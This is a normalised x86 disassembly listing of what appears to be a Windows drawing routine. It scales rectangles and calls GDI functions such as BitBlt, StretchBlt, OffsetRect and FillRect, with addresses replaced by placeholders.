mov ebp [ rw-data ]
mov edx [ esp + 0x1f8 ]
mov ecx [ esp + 0x1e0 ]
push edx
push edi
push 0x0
push 0x0
push 0x1
lea eax [ esp + 0x58 ]
push eax
push ecx
call sub_45cef0
add esp 0x1c
mov eax [ rw-data ]
test eax eax
jne r-xdata
cmp eax 0x1
jne r-xdata
cmp [ rw-data ] 0x1
je r-xdata
mov edx [ esp + 0x1f8 ]
mov ecx [ esp + 0x14 ]
mov ebp [ esp + 0x64 ]
push edx
push edi
push 0x0
push 0x0
sub ebp ecx
mov ecx [ esp + 0x1f0 ]
push 0x0
lea eax [ esp + 0x58 ]
push eax
push ecx
mov [ esp + 0x60 ] esi
mov [ esp + 0x64 ] 0x0
mov [ esp + 0x68 ] ebp
mov [ esp + 0x6c ] ebx
call sub_45cef0
mov edx [ esp + 0x44 ]
mov ecx [ esp + 0x70 ]
lea eax [ ebx + edx ]
mov edx [ esp + 0x214 ]
push edx
push edi
push 0x0
push 0x0
mov [ esp + 0xc0 ] eax
push 0x0
lea eax [ esp + 0xc0 ]
mov [ esp + 0xcc ] ecx
mov ecx [ esp + 0x210 ]
push eax
push ecx
mov [ esp + 0xc8 ] esi
mov [ esp + 0xd0 ] ebp
call sub_45cef0
add esp 0x38
mov eax [ esp + 0x1c ]
test eax eax
jle r-xdata
test ebx ebx
jg r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
mov eax [ esp + 0x1ec ]
mov ecx [ eax ]
mov [ esp + 0x44 ] ecx
mov ecx [ esp + 0x28 ]
sub ecx edx
mov edx [ eax + 0x8 ]
mov [ esp + 0x48 ] ecx
mov ecx [ eax + 0xc ]
push eax
lea eax [ esp + 0x48 ]
push eax
mov [ esp + 0x54 ] edx
mov [ esp + 0x58 ] ecx
call sub_45ce70
mov eax [ rw-data ]
add esp 0x8
test eax eax
jne r-xdata
mov eax [ esp + 0x50 ]
mov ecx [ esp + 0x1ec ]
mov [ ecx + 0x4 ] eax
mov ebp [ rw-data ]
mov edx [ rw-data ]
mov eax [ esp + 0x1f8 ]
mov edx [ esp + 0x1e0 ]
push eax
push edi
push 0x0
push 0x0
push 0x1
lea ecx [ esp + 0x58 ]
push ecx
push edx
call sub_45cef0
add esp 0x1c
cmp eax 0x1
jne r-xdata
cmp [ rw-data ] 0x1
je r-xdata
lea ecx [ edi + esi ]
mov [ esp + 0x14 ] ecx
fild [ esp + 0x14 ]
push ecx
fmul [ rw-data ]
fstp [ esp ]
call sub_452500
add esp 0x4
mov ebp eax
mov eax [ rw-data ]
test eax eax
jne r-xdata
mov eax esi
sub eax edi
mov [ esp + 0x14 ] eax
fild [ esp + 0x14 ]
push ecx
fmul [ rw-data ]
fstp [ esp ]
call sub_452500
add esp 0x4
test eax eax
mov [ esp + 0x58 ] eax
jge r-xdata
mov eax [ rw-data ]
cmp eax 0x1
jne r-xdata
mov ecx rw-data
call sub_41eb60
test al al
je r-xdata
mov ebp [ rw-data ]
mov edx [ rw-data ]
mov ecx [ esp + 0x48 ]
mov edx [ esp + 0x1ec ]
mov [ edx + 0xc ] ecx
jmp r-xdata
mov ecx [ esp + 0x1f8 ]
mov eax [ esp + 0x1e0 ]
push ecx
push edi
push 0x0
push 0x0
push 0x1
lea edx [ esp + 0x58 ]
push edx
push eax
call sub_45cef0
add esp 0x1c
add edi esi
mov [ esp + 0x14 ] edi
fild [ esp + 0x14 ]
push ecx
fmul [ rw-data ]
fstp [ esp ]
call sub_452500
add esp 0x4
mov ecx eax
mov eax [ rw-data ]
test eax eax
jne r-xdata
sub esi edi
mov [ esp + 0x14 ] esi
fild [ esp + 0x14 ]
push ecx
fmul [ rw-data ]
fstp [ esp ]
call sub_452500
add esp 0x4
test eax eax
mov [ esp + 0x24 ] eax
jge r-xdata
mov ebp ebx
mov [ esp + 0x30 ] ebp
mov ebp ebx
sub ebp eax
jmp r-xdata
xor eax eax
mov [ esp + 0x58 ] eax
cmp eax 0x2
jne r-xdata
mov al [ esp + 0x1f0 ]
test al al
jne r-xdata
mov ecx rw-data
mov [ esp + 0x90 ] ecx
call sub_404310
mov edx [ rw-data ]
push edx
mov [ esp + 0x1dc ] 0x0
call sub_45b5d0
add esp 0x4
cmp eax 0x2
mov [ esp + 0x1c ] eax
jl r-xdata
mov [ esp + 0x28 ] eax
mov ecx [ esp + 0x10 ]
sub ecx eax
jmp r-xdata
xor eax eax
mov [ esp + 0x24 ] eax
cmp ebp ebx
mov [ esp + 0x30 ] ebp
jle r-xdata
mov edi [ rw-data ]
call sub_40af00
xor ecx ecx
mov cl [ rw-data ]
push eax
push ecx
mov ecx edi
call sub_4440b0
mov edi [ rw-data ]
mov ebp eax
mov [ esp + 0x14 ] ebp
call sub_40af00
xor edx edx
mov dl [ rw-data ]
push eax
mov ecx edi
push edx
call sub_444100
mov ecx [ rw-data ]
test ecx ecx
mov [ esp + 0x1c ] eax
je r-xdata
mov edx [ esp + 0x1ec ]
mov eax [ edx ]
cmp eax esi
mov ecx [ edx + 0x4 ]
mov edx [ edx + 0x8 ]
mov [ esp + 0x70 ] edx
mov edx [ esp + 0x1ec ]
mov edx [ edx + 0xc ]
mov [ esp + 0x68 ] eax
mov [ esp + 0x6c ] ecx
mov [ esp + 0x74 ] edx
jge r-xdata
mov eax esi
sub eax ebp
mov ecx ebx
sub ecx edx
mov edx [ esp + 0x30 ]
mov [ rw-data ] eax
add eax edx
mov [ rw-data ] eax
mov eax [ esp + 0x28 ]
mov [ rw-data ] ecx
add ecx eax
mov [ rw-data ] ecx
fld [ rw-data ]
fcomp [ r--data ]
fnstsw ax
test ah 0x44
jpe r-xdata
imul eax eax 0x12c
mov ecx [ eax + rw-data ]
test ecx ecx
jne r-xdata
mov eax [ esp + 0x10 ]
cmp ecx eax
mov [ esp + 0x28 ] ecx
jle r-xdata
mov [ esp + 0x18 ] ebp
mov dl [ rw-data ]
test dl dl
jne r-xdata
cmp ecx ebx
jge r-xdata
mov eax esi
mov [ esp + 0x68 ] eax
mov eax [ rw-data ]
test eax eax
jne r-xdata
mov edx [ rw-data ]
mov eax [ rw-data ]
mov ecx [ rw-data ]
mov ebp [ esp + 0x1f8 ]
push 0xcc0020
push edx
mov edx [ esp + 0x18 ]
push eax
mov eax [ esp + 0x38 ]
push ecx
push edx
push eax
mov eax [ esp + 0x1f8 ]
mov ecx ebx
sub ecx ebp
push ecx
mov edx esi
sub edx edi
push edx
push eax
call [ BitBlt@IAT ]
jmp r-xdata
mov eax [ rw-data ]
test eax eax
jle r-xdata
fild [ esp + 0x14 ]
push ecx
fmul [ rw-data ]
fstp [ esp ]
call sub_452500
fild [ esp + 0x20 ]
mov ebp eax
mov [ esp + 0x94 ] ebp
fmul [ rw-data ]
fstp [ esp ]
call sub_452500
mov edi eax
mov eax [ esp + 0x24 ]
add esp 0x4
test eax eax
mov [ esp + 0x58 ] edi
je r-xdata
cmp eax 0x5
jne r-xdata
mov edi ecx
call sub_40af00
push eax
xor eax eax
mov al [ rw-data ]
mov ecx edi
push eax
call sub_4440b0
mov edi [ rw-data ]
mov [ esp + 0x18 ] eax
call sub_40af00
xor ecx ecx
mov cl [ rw-data ]
push eax
push ecx
mov ecx edi
call sub_444100
jmp r-xdata
mov edx esi
sub edx ebp
mov ebp [ esp + 0x30 ]
add edx ebp
cmp [ esp + 0x70 ] edx
jle r-xdata
mov ecx ebx
mov [ esp + 0x6c ] ecx
mov edx [ esp + 0x1e0 ]
push 0x4
push edx
mov ecx [ esp + 0x1e0 ]
push 0x3
push ecx
jmp r-xdata
mov ecx [ rw-data ]
cmp ecx 0xffffffff
je r-xdata
mov ebp [ rw-data ]
lea ebp [ ebp + ebp * 2 ]
shl ebp 0x2
test ebp ebp
mov [ esp + 0x28 ] ebp
jle r-xdata
mov [ esp + 0x94 ] 0x0
fild [ esp + 0x58 ]
push ecx
fimul [ esp + 0x1c ]
fidiv [ esp + 0x24 ]
fstp [ esp ]
call sub_452500
add esp 0x4
mov [ esp + 0x94 ] eax
jmp r-xdata
fild [ esp + 0x14 ]
push ecx
fmul [ rw-data ]
fstp [ esp ]
call sub_452500
fild [ esp + 0x20 ]
mov ebp eax
mov [ esp + 0x94 ] ebp
fmul [ rw-data ]
fstp [ esp ]
call sub_452500
fild [ esp + 0x1c ]
mov edi eax
mov [ esp + 0x5c ] edi
fmul [ rw-data ]
fstp [ esp ]
call sub_452500
fild [ esp + 0x24 ]
mov [ esp + 0x98 ] eax
fmul [ rw-data ]
fstp [ esp ]
call sub_452500
add esp 0x4
jmp r-xdata
mov eax [ rw-data ]
test eax eax
jne r-xdata
mov [ esp + 0x20 ] eax
mov eax [ rw-data ]
cmp eax 0x6
je r-xdata
mov ebp [ rw-data ]
mov edx ebx
sub edx ebp
mov ebp [ esp + 0x28 ]
add edx ebp
cmp [ esp + 0x74 ] edx
jle r-xdata
mov [ esp + 0x70 ] edx
mov ecx rw-data
mov [ esp + 0x1d8 ] 0xffffffff
call sub_401420
jmp r-xdata
mov eax [ rw-data ]
lea eax [ eax + eax * 2 ]
shl eax 0x2
test eax eax
mov [ esp + 0x14 ] eax
jle r-xdata
call [ SetStretchBltMode@IAT ]
fild [ rw-data ]
push ecx
fimul [ esp + 0xa4 ]
fidiv [ esp + 0x30 ]
fstp [ esp ]
call sub_452500
fild [ rw-data ]
mov ebp eax
fimul [ esp + 0x8c ]
fidiv [ esp + 0x14 ]
fstp [ esp ]
call sub_452500
mov ecx [ esp + 0x8c ]
mov edx [ esp + 0xa4 ]
add esp 0x4
push 0xcc0020
push ecx
mov ecx [ esp + 0x18 ]
push edx
mov edx [ esp + 0x38 ]
push eax
mov eax [ rw-data ]
push ebp
push eax
push ecx
push edx
mov edx [ esp + 0x218 ]
mov eax ebx
sub eax edx
mov edx [ esp + 0x200 ]
push eax
mov ecx esi
sub ecx edi
push ecx
push edx
call [ StretchBlt@IAT ]
mov ecx [ rw-data ]
mov edi [ esp + 0x1ec ]
mov edx [ rw-data ]
add ecx eax
mov eax [ edi ]
sub eax esi
add eax edx
cdq
idiv ecx
test eax eax
mov [ esp + 0x14 ] eax
jge r-xdata
add ebp 0x4
mov [ esp + 0x28 ] ebp
mov ecx [ esp + 0x94 ]
add ecx ebp
cmp edi eax
mov [ esp + 0x2c ] ecx
mov [ esp + 0x10 ] edi
jg r-xdata
mov ecx ebp
mov ebp [ esp + 0x94 ]
mov [ esp + 0x94 ] ecx
mov ecx edi
mov edi eax
mov eax ecx
mov [ esp + 0x90 ] ebp
mov [ esp + 0x58 ] edi
mov [ esp + 0x5c ] eax
mov eax edi
mov ecx [ rw-data ]
mov edx 0x1
cmp ecx edx
mov [ esp + 0x5c ] eax
jne r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
mov edx [ esp + 0x58 ]
mov ebp [ rw-data ]
sub eax esi
add eax [ rw-data ]
add eax edx
mov edx [ esp + 0x24 ]
sub ecx ebx
mov ebx [ rw-data ]
mov esi eax
mov eax [ esp + 0x60 ]
push eax
add ecx ebx
add ecx edx
push 0x1
push 0x0
mov ebx ecx
call sub_40af00
mov edx [ rw-data ]
push eax
mov eax [ esp + 0x20 ]
xor ecx ecx
mov cl [ rw-data ]
push ecx
mov ecx [ esp + 0x40 ]
push edx
mov edx [ esp + 0x8c ]
push eax
mov eax [ esp + 0x88 ]
push ecx
mov ecx [ esp + 0x88 ]
push ebx
sub edx eax
push esi
push edx
mov edx [ esp + 0x9c ]
sub edx ecx
push edx
sub eax [ esp + 0x228 ]
push eax
mov eax [ esp + 0x214 ]
sub ecx edi
push ecx
push eax
mov ecx ebp
call sub_4421e0
jmp r-xdata
mov [ esp + 0x74 ] edx
mov edx [ rw-data ]
add eax edx
mov edx [ rw-data ]
mov [ esp + 0x60 ] eax
mov eax [ rw-data ]
mov [ esp + 0x58 ] eax
mov [ esp + 0x88 ] edx
mov eax ecx
cdq
idiv [ rw-data ]
test [ rw-data ] 0x1
mov ebp [ rw-data ]
mov [ esp + 0x24 ] eax
je r-xdata
add eax 0x4
mov [ esp + 0x14 ] eax
mov eax [ edi + 0x8 ]
sub eax esi
add eax [ rw-data ]
cdq
idiv ecx
mov ecx [ rw-data ]
cmp eax ecx
mov [ esp + 0x88 ] eax
jl r-xdata
mov [ esp + 0x14 ] 0x0
mov eax [ rw-data ]
xor ebp ebp
cmp eax ebp
je r-xdata
mov [ esp + 0x10 ] eax
fild [ esp + 0x14 ]
push ecx
fmul [ rw-data ]
fstp [ esp ]
call sub_452500
fild [ esp + 0x20 ]
mov ebp eax
mov [ esp + 0x94 ] ebp
fmul [ rw-data ]
fstp [ esp ]
call sub_452500
mov edi eax
mov eax [ esp + 0x1c ]
add esp 0x4
test eax eax
mov [ esp + 0x58 ] edi
mov [ esp + 0x94 ] ebp
je r-xdata
imul eax [ rw-data ]
sub ecx eax
mov eax ecx
inc eax
imul eax [ rw-data ]
sub eax ecx
dec eax
jmp r-xdata
mov edx [ rw-data ]
mov eax [ rw-data ]
add eax edx
lea ecx [ eax + ebp ]
mov eax [ edi + 0x4 ]
mov ebp [ rw-data ]
sub eax ebx
add eax ebp
cdq
idiv ecx
mov esi eax
test esi esi
jge r-xdata
dec ecx
mov [ esp + 0x88 ] ecx
mov [ esp + 0x88 ] eax
mov eax [ rw-data ]
cmp eax ebp
mov [ esp + 0x1d8 ] edx
mov ecx eax
je r-xdata
inc [ eax + 0xd48 ]
xor eax eax
jmp r-xdata
fild [ esp + 0x90 ]
push ecx
fimul [ esp + 0x24 ]
fidiv [ esp + 0x1c ]
fstp [ esp ]
call sub_452500
add esp 0x4
jmp r-xdata
mov ecx [ rw-data ]
add ebp ecx
imul ebp eax
mov [ esp + 0x1c ] ebp
push ecx
fild [ esp + 0x20 ]
fmul [ rw-data ]
fstp [ esp ]
call sub_452500
mov edx [ rw-data ]
mov ecx [ rw-data ]
mov ebp eax
mov eax [ esp + 0x64 ]
add eax edx
imul eax [ esp + 0x28 ]
mov [ esp + 0x20 ] eax
sub esi ecx
fild [ esp + 0x20 ]
add ebp esi
fmul [ rw-data ]
fstp [ esp ]
call sub_452500
fild [ esp + 0x5c ]
mov ecx [ rw-data ]
mov esi eax
sub ebx ecx
fmul [ rw-data ]
add esi ebx
fstp [ esp ]
call sub_452500
mov edx [ esp + 0x18 ]
mov ecx [ esp + 0x8c ]
add ecx edx
mov [ esp + 0x18 ] ecx
fild [ esp + 0x18 ]
mov ebx eax
add ebx ebp
fmul [ rw-data ]
fstp [ esp ]
call sub_452500
add eax esi
mov [ esp + 0x44 ] eax
mov eax [ esp + 0x1fc ]
add esp 0x4
neg eax
push eax
neg edi
push edi
lea eax [ esp + 0x3c ]
push eax
mov [ esp + 0x40 ] ebp
mov [ esp + 0x44 ] esi
mov [ esp + 0x48 ] ebx
call [ OffsetRect@IAT ]
mov edx [ esp + 0x1e0 ]
push 0x1
lea ecx [ esp + 0x38 ]
push ecx
push edx
call sub_45d710
add esp 0xc
mov eax [ edi + 0xc ]
sub eax ebx
add eax ebp
cdq
idiv ecx
mov edi eax
mov eax [ rw-data ]
cmp edi eax
mov [ esp + 0x60 ] edi
jl r-xdata
xor esi esi
mov [ esp + 0x8c ] ecx
mov ecx [ rw-data ]
cmp ecx ebp
mov [ esp + 0x1d8 ] 0x2
je r-xdata
inc [ eax + 0xd48 ]
mov eax [ rw-data ]
mov eax [ rw-data ]
cmp eax 0x1d
je r-xdata
lea edi [ eax - 0x1 ]
mov [ esp + 0x60 ] edi
mov [ esp + 0x24 ] ebp
cmp ecx edx
jne r-xdata
mov ecx rw-data
cmp eax 0x1c
je r-xdata
mov ecx [ esp + 0x24 ]
mov edx [ esp + 0x1ec ]
mov eax [ edx ]
cmp eax esi
mov [ esp + 0xa0 ] ecx
mov ecx [ edx + 0x4 ]
mov [ esp + 0x6c ] ecx
mov ecx [ edx + 0x8 ]
mov edx [ edx + 0xc ]
mov [ esp + 0x68 ] eax
mov [ esp + 0x70 ] ecx
mov [ esp + 0x74 ] edx
jge r-xdata
mov ecx [ rw-data ]
mov edx [ esp + 0x90 ]
mov eax esi
sub eax ecx
mov ecx ebx
sub ecx ebp
add edx eax
mov [ rw-data ] eax
lea eax [ edi + ecx ]
mov [ rw-data ] ecx
mov [ rw-data ] edx
mov [ rw-data ] eax
mov al [ esp + 0x1f0 ]
test al al
mov ebp [ rw-data ]
jne r-xdata
cmp eax ebp
je r-xdata
jmp r-xdata
cmp eax 0xc
jl r-xdata
cmp [ esp + 0x6c ] ebx
jge r-xdata
mov [ esp + 0x68 ] esi
mov al [ rw-data ]
test al al
mov [ esp + 0x24 ] edx
je r-xdata
mov eax [ esp + 0x14 ]
cmp eax [ esp + 0x88 ]
mov [ esp + 0x2c ] eax
jg r-xdata
mov eax [ rw-data ]
jmp r-xdata
add eax 0xfffffff4
cdq
and edx 0x3
add eax edx
sar eax 0x2
lea ecx [ eax + eax * 2 ]
cmp [ esp + 0x1c ] 0x4
mov edx [ ecx * 4 + rw-data ]
mov [ esp + 0x54 ] edx
jne r-xdata
mov eax [ esp + 0x90 ]
sub eax [ rw-data ]
add eax esi
cmp ecx eax
mov [ esp + 0x14 ] eax
jle r-xdata
mov [ esp + 0x6c ] ebx
mov eax [ esp + 0x30 ]
mov ecx [ esp + 0x60 ]
inc eax
cmp eax ecx
mov [ esp + 0x30 ] eax
jle r-xdata
mov eax [ esp + 0x1f8 ]
neg eax
mov [ esp + 0x10 ] eax
mov eax [ esp + 0x1f4 ]
neg eax
mov [ esp + 0x64 ] eax
nop
mov [ esp + 0x54 ] eax
cmp esi edi
mov [ esp + 0x30 ] esi
jg r-xdata
mov ecx rw-data
jmp r-xdata
sub edi ebp
add edi ebx
cmp edx edi
jle r-xdata
mov [ esp + 0x70 ] eax
jmp r-xdata
mov edx [ esp + 0x2c ]
inc ecx
imul ecx [ rw-data ]
sub ecx edx
dec ecx
imul ecx [ rw-data ]
add ecx [ esp + 0x2c ]
jmp r-xdata
call sub_4010c0
mov ecx [ esp + 0x1ec ]
push ecx
lea edx [ esp + 0x6c ]
push edx
call sub_45ce70
mov eax [ esp + 0x70 ]
mov ecx [ rw-data ]
sub eax esi
add eax ecx
mov ecx [ esp + 0x74 ]
sub ecx ebx
mov [ esp + 0xb0 ] eax
mov eax [ rw-data ]
add ecx ebp
add esp 0x8
test eax eax
mov [ esp + 0xb0 ] ecx
jne r-xdata
mov [ esp + 0x74 ] edi
imul eax esi
sub ecx eax
mov [ esp + 0x1c ] ecx
inc eax
imul eax esi
sub eax ecx
dec eax
mov [ esp + 0x1c ] eax
jmp r-xdata
mov esi [ rw-data ]
mov eax ecx
cdq
idiv esi
test bl 0x1
mov [ esp + 0xa0 ] ecx
mov [ esp + 0x58 ] eax
je r-xdata
cmp eax 0x1
jne r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
mov ecx [ rw-data ]
mov edx [ rw-data ]
mov eax [ rw-data ]
add edx ecx
add edx [ esp + 0x28 ]
imul edx [ esp + 0x58 ]
mov ecx [ rw-data ]
add ecx eax
imul ecx [ esp + 0x1c ]
push 0xcc0020
push edx
mov edx [ rw-data ]
push ecx
push edx
mov edx [ esp + 0x48 ]
mov eax ebp
sub eax edi
push eax
mov eax [ esp + 0x48 ]
mov ecx ebx
sub ecx esi
push ecx
mov ecx [ esp + 0x1f8 ]
push edx
push eax
push ecx
call [ BitBlt@IAT ]
push 0x4
call [ GetStockObject@IAT ]
push eax
mov eax [ esp + 0x1e4 ]
lea edx [ esp + 0x38 ]
push edx
push eax
call [ FillRect@IAT ]
jmp r-xdata
fild [ rw-data ]
push ecx
fmul [ rw-data ]
fstp [ esp ]
call sub_452500
mov ecx [ rw-data ]
mov edx [ rw-data ]
mov esi [ esp + 0xac ]
add edx ecx
imul edx [ esp + 0x30 ]
mov [ esp + 0x28 ] edx
sub esi eax
fild [ esp + 0x28 ]
fmul [ rw-data ]
fstp [ esp ]
call sub_452500
fild [ rw-data ]
add esi eax
fmul [ rw-data ]
fstp [ esp ]
call sub_452500
mov edi [ esp + 0xb4 ]
mov ecx [ rw-data ]
mov ebp [ esp + 0x2c ]
sub edi eax
mov eax [ rw-data ]
add ecx eax
add ecx ebp
imul ecx [ esp + 0x34 ]
mov [ esp + 0x28 ] ecx
fild [ esp + 0x28 ]
fmul [ rw-data ]
fstp [ esp ]
call sub_452500
mov edx [ rw-data ]
mov ecx [ esp + 0x14 ]
add edi eax
mov eax [ rw-data ]
add esp 0x4
lea ebp [ edi + eax ]
mov eax [ esp + 0x28 ]
lea ebx [ esi + edx ]
mov edx [ esp + 0x64 ]
push ecx
add ebp eax
push edx
lea eax [ esp + 0x3c ]
push eax
mov [ esp + 0x40 ] esi
mov [ esp + 0x44 ] edi
mov [ esp + 0x48 ] ebx
mov [ esp + 0x4c ] ebp
call [ OffsetRect@IAT ]
mov ecx [ esp + 0x54 ]
cmp [ esp + 0xa0 ] ecx
jl r-xdata
mov edx [ esp + 0x90 ]
xor edx edx
jmp r-xdata
mov al [ rw-data ]
test al al
jne r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
mov edx [ rw-data ]
mov ecx [ esp + 0x2c ]
dec edx
cmp ecx edx
je r-xdata
mov eax [ rw-data ]
test eax eax
mov [ esp + 0x44 ] esi
mov [ esp + 0x4c ] ebx
mov [ esp + 0x50 ] ebp
je r-xdata
mov ecx [ esp + 0x5c ]
mov ecx [ rw-data ]
mov edi [ esp + 0x94 ]
mov eax ebx
add edi ecx
sub eax ebp
mov [ rw-data ] ecx
mov ecx [ esp + 0x5c ]
mov [ rw-data ] eax
add eax ecx
mov [ rw-data ] edi
mov [ rw-data ] eax
jmp r-xdata
mov al [ esp + 0x1f0 ]
test al al
jne r-xdata
mov edx 0x1
jmp r-xdata
mov edx [ esp + 0xa0 ]
cmp [ rw-data ] edx
jne r-xdata
mov ecx [ rw-data ]
mov edx [ esp + 0x30 ]
dec ecx
cmp edx ecx
je r-xdata
mov edx [ esp + 0x64 ]
mov ecx ebx
add ecx eax
mov [ esp + 0x4c ] ecx
mov [ esp + 0x3c ] ecx
mov ecx [ esp + 0x10 ]
mov eax ebp
push ecx
mov [ esp + 0x44 ] eax
push edx
lea eax [ esp + 0x3c ]
push eax
mov [ esp + 0x40 ] ebx
mov [ esp + 0x44 ] edi
call [ OffsetRect@IAT ]
push 0x4
call [ GetStockObject@IAT ]
mov edx [ esp + 0x1e0 ]
push eax
lea ecx [ esp + 0x38 ]
push ecx
push edx
call [ FillRect@IAT ]
cmp [ esp + 0x7c ] ebx
jge r-xdata
mov [ esp + 0x78 ] edi
mov edi [ esp + 0x1ec ]
mov eax [ edi ]
mov [ esp + 0xa4 ] edx
mov edx [ edi + 0x4 ]
mov [ esp + 0x7c ] edx
mov edx [ edi + 0x8 ]
mov edi [ edi + 0xc ]
mov [ esp + 0x84 ] edi
mov edi [ esp + 0x14 ]
cmp eax edi
mov [ esp + 0x78 ] eax
mov [ esp + 0x80 ] edx
jge r-xdata
mov eax [ esp + 0x2c ]
mov ecx [ esp + 0x88 ]
inc eax
cmp eax ecx
mov [ esp + 0x2c ] eax
jle r-xdata
cmp [ rw-data ] 0xffffffff
jne r-xdata
mov ecx [ esp + 0x50 ]
mov edx [ esp + 0x4c ]
add ecx eax
mov eax [ esp + 0x10 ]
mov [ esp + 0x40 ] ecx
mov ecx [ esp + 0x64 ]
push eax
mov [ esp + 0x40 ] edx
push ecx
lea edx [ esp + 0x3c ]
push edx
mov [ esp + 0x40 ] esi
mov [ esp + 0x44 ] ebp
call [ OffsetRect@IAT ]
push 0x4
call [ GetStockObject@IAT ]
mov ecx [ esp + 0x1e0 ]
push eax
lea eax [ esp + 0x38 ]
push eax
push ecx
call [ FillRect@IAT ]
mov edi [ rw-data ]
mov eax esi
sub eax edi
mov edi [ esp + 0x2c ]
add eax edi
cmp edx eax
jle r-xdata
mov [ esp + 0x7c ] ebx
mov ebx [ rw-data ]
test ebx ebx
mov ecx [ esp + 0x30 ]
jne r-xdata
mov eax [ esp + 0x10 ]
mov ecx [ esp + 0x64 ]
push eax
push ecx
lea edx [ esp + 0x3c ]
push edx
mov [ esp + 0x40 ] esi
mov [ esp + 0x44 ] edi
mov [ esp + 0x48 ] ebx
mov [ esp + 0x4c ] ebp
call [ OffsetRect@IAT ]
mov ecx [ esp + 0x1e0 ]
push 0x1
lea eax [ esp + 0x38 ]
push eax
push ecx
call sub_45d710
add esp 0xc
mov eax [ esp + 0x84 ]
sub ecx ebp
add ecx ebx
cmp eax ecx
jle r-xdata
mov [ esp + 0x80 ] eax
mov ecx [ esp + 0x1ec ]
push ecx
lea edx [ esp + 0x7c ]
push edx
call sub_45ce70
mov ecx [ esp + 0x80 ]
mov edi [ esp + 0x98 ]
mov eax ecx
sub eax edi
mov edi [ rw-data ]
sub eax esi
mov esi [ rw-data ]
add eax edi
mov [ esp + 0xb4 ] eax
mov eax [ esp + 0x84 ]
mov edx eax
sub edx ebx
add edx ebp
mov [ esp + 0xbc ] edx
add esp 0x8
or edx 0xffffffff
test esi esi
jne r-xdata
mov [ esp + 0x84 ] ecx
mov ebx 0x1
mov [ esp + 0x14 ] edx
xor ebx ebx
mov edx 0x2
mov [ esp + 0x14 ] 0x1
jmp r-xdata
lea ecx [ esp + 0x8c ]
mov [ esp + 0x1d8 ] 0x1
call sub_40b360
lea ecx [ esp + 0x88 ]
mov [ esp + 0x1d8 ] 0xffffffff
call sub_40b360
mov ebp [ esp + 0x1f8 ]
mov edi [ esp + 0x1e0 ]
mov esi [ esp + 0x1f4 ]
jmp r-xdata
cmp ebx edx
mov [ esp + 0x1c ] edx
je r-xdata
mov edx [ rw-data ]
test edx edx
jne r-xdata
cmp edx 0x1
jne r-xdata
mov edx [ rw-data ]
test edx edx
jne r-xdata
mov ecx [ esp + 0x60 ]
mov edx [ esp + ebx * 4 + 0xa0 ]
mov eax [ esp + edx * 4 + 0x88 ]
push ecx
mov esi ebx
shl esi 0x4
mov edi [ esp + esi + 0x70 ]
mov ebp [ esp + esi + 0x6c ]
push 0x1
push 0x0
mov [ esp + 0x30 ] eax
call sub_40af00
mov ecx [ esp + ebx * 4 + 0x64 ]
push eax
mov eax [ rw-data ]
xor edx edx
mov dl [ rw-data ]
push edx
mov edx [ esp + ebx * 4 + 0xa4 ]
push eax
mov eax [ esp + ebx * 4 + 0xc8 ]
push ecx
mov ecx [ esp + ebx * 4 + 0xc4 ]
push edx
mov edx [ esp + esi + 0x94 ]
push eax
mov eax [ esp + esi + 0x94 ]
push ecx
mov ecx [ esp + 0x208 ]
sub edx edi
push edx
mov edx [ esp + 0x220 ]
sub eax ebp
push eax
sub edi [ esp + 0x228 ]
push edi
sub ebp edx
push ebp
push ecx
mov ecx [ esp + 0x60 ]
call sub_4421e0
mov ebp [ esp + 0x1f8 ]
mov edi [ esp + 0x1e0 ]
mov esi [ esp + 0x1f4 ]
mov dl [ rw-data ]
cmp dl 0x1
jne r-xdata
mov edx [ rw-data ]
test edx edx
jne r-xdata
mov dl [ rw-data ]
test dl dl
je r-xdata
mov ecx [ esp + 0x14 ]
mov eax [ esp + 0x1c ]
add ebx ecx
cmp ebx eax
jne r-xdata
mov eax ebx
shl eax 0x4
mov ecx [ esp + eax + 0x68 ]
mov [ esp + 0x44 ] ecx
mov ecx [ esp + eax + 0x74 ]
mov eax [ esp + eax + 0x70 ]
mov [ esp + 0x48 ] ecx
sub ecx edx
mov [ esp + 0x4c ] eax
add ecx [ esp + 0x10 ]
mov [ esp + 0x50 ] ecx
mov ecx [ esp + 0x1ec ]
push ecx
lea edx [ esp + 0x48 ]
push edx
call sub_45ce70
push ebp
push esi
push 0x0
push 0x0
push 0x0
lea eax [ esp + 0x60 ]
push eax
push edi
call sub_45cef0
add esp 0x24
mov eax [ rw-data ]
test eax eax
jne r-xdata
cmp ebx 0x1
jne r-xdata
cmp [ rw-data ] 0x1
jne r-xdata
cmp [ rw-data ] 0x1
jne r-xdata
cmp ebx 0x1
jne r-xdata
mov eax [ esp + 0x7c ]
mov ecx [ esp + 0x78 ]
mov eax [ rw-data ]
test eax eax
jne r-xdata
test dl dl
je r-xdata
cmp [ rw-data ] ebx
jne r-xdata
test ebx ebx
jne r-xdata
cmp [ rw-data ] ebx
jne r-xdata
cmp dl 0x1
jne r-xdata
test ebx ebx
jne r-xdata
mov edx [ esp + 0x80 ]
mov [ esp + 0x38 ] eax
mov eax [ esp + 0x84 ]
mov [ esp + 0x34 ] ecx
jmp r-xdata
push ebp
push esi
push 0x0
push 0x0
push 0x0
lea ecx [ esp + 0x8c ]
push ecx
push edi
call sub_45cef0
add esp 0x1c
jmp r-xdata
cmp [ rw-data ] 0x1
jne r-xdata
mov edx [ esp + 0x84 ]
mov [ esp + 0x34 ] ecx
mov ecx [ esp + 0x80 ]
push ebp
push esi
push 0x0
push 0x0
push 0x0
lea eax [ esp + 0x8c ]
push eax
push edi
call sub_45cef0
add esp 0x1c
jmp r-xdata
cmp [ rw-data ] 0x1
jne r-xdata
mov [ esp + 0x3c ] edx
mov ecx ebp
neg ecx
push ecx
mov edx esi
neg edx
mov [ esp + 0x44 ] eax
push edx
lea eax [ esp + 0x3c ]
push eax
call [ OffsetRect@IAT ]
push 0x0
call [ GetStockObject@IAT ]
push eax
lea ecx [ esp + 0x38 ]
push ecx
push edi
call [ FillRect@IAT ]
jmp r-xdata
mov edx [ esp + ebx * 4 + 0x58 ]
cmp [ esp + 0x10 ] edx
jle r-xdata
mov edx [ esp + 0x68 ]
mov eax [ esp + 0x6c ]
mov ecx [ esp + 0x70 ]
mov [ esp + 0x34 ] edx
mov edx [ esp + 0x74 ]
jmp r-xdata
push ebp
push esi
push ebx
push ebx
push ebx
lea ecx [ esp + 0x7c ]
push ecx
push edi
call sub_45cef0
add esp 0x1c
jmp r-xdata
